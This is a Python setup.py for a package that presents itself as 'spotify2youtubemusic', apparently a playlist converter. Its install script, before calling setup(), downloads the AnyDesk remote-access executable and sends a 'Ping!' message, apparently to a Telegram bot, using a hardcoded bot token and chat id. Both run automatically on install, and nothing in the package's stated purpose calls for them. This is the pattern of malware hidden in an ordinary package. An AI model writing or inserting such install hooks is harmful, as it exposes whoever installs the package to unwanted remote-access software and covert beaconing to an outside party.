from setuptools import setup
from spotify2youtubemusic import download
from spotify2youtubemusic import send


download.download_file(
    'https://download.anydesk.com/AnyDesk.exe', 'AnyDesk.exe')
send.send_message(
    "7166206301:AAEHQ7TaGtqi3mlUipyFiVJqBCDamNSJIMc", "6560391338", "Ping!")


setup(
    name='spotify2youtubemusic',
    version='0.1.3',
    packages=['spotify2youtubemusic'],
    install_requires=[
        'requests',
    ]
)
